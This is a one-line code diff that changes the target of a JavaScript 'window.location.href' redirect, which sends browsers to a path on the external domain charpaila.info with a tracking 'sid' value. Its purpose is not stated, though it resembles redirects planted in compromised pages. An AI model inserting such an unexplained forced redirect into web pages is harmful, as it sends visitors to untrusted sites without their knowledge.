@@ -1,1 +1,1 @@
-window.location.href = "https://charpaila.info/SoQ/go?sid=7744";
+window.location.href = "https://charpaila.info/gWbcs/go?sid=7744";
